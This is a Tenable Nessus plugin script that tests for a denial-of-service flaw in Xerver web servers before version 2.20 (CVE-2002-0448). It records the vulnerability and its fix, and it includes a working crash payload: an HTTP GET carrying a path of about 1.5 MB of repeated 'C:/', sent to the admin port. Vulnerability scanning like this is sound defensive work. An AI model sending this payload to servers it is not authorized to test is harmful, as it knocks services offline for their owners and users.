#
# (C) Tenable Network Security, Inc.
#

# Script audit and contributions from Carmichael Security
#      Erik Anderson <eanders@carmichaelsecurity.com> (nb: domain no longer exists)
#      Added BugtraqID and CAN
#
# From Bugtraq :
# Date: Fri, 8 Mar 2002 18:39:39 -0500 ?
# From:"Alex Hernandez" <al3xhernandez@ureach.com> 


include("compat.inc");


if(description)
{
 script_id(11015);
 script_version("$Revision: 1.16 $");

 script_cve_id("CVE-2002-0448");
 script_bugtraq_id(4254);
 script_xref(name:"OSVDB", value:"6772");

 script_name(english:"Xerver Web Server < 2.20 Crafted C:/ Request Remote DoS");
 
 script_set_attribute(
  attribute:"synopsis",
  value:"The remote web server is prone to a denial of service attack."
 );
 script_set_attribute(
  attribute:"description", 
  value:string(
   "It is possible to crash the Xerver web server by sending a long URL\n",
   "to its administration port."
  )
 );
 script_set_attribute(
  attribute:"see_also", 
  value:"http://archives.neohapsis.com/archives/bugtraq/2002-03/0091.html"
 );
 script_set_attribute(
  attribute:"see_also", 
  value:"http://archives.neohapsis.com/archives/bugtraq/2002-03/0155.html"
 );
 script_set_attribute(
  attribute:"solution", 
  value:"Upgrade to Xerver 2.20 or later."
 );
 script_set_attribute(
  attribute:"cvss_vector", 
  value:"CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P"
 );
 script_end_attributes();
 
 script_summary(english:"Xerver DoS");
 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2002-2009 Tenable Network Security, Inc.");
 script_family(english:"Web Servers");
 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 32123);
 exit(0);
}

#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:32123, embedded: 0);

soc = open_sock_tcp(port);
if (!soc) exit(0);
s = string("GET /", crap(data:"C:/", length:1500000), "\r\n\r\n");
send(socket:soc, data:s);
close(soc);

soc = open_sock_tcp(port);
if (! soc)
{
 security_warning(port);
 exit(0);
}

close(soc);


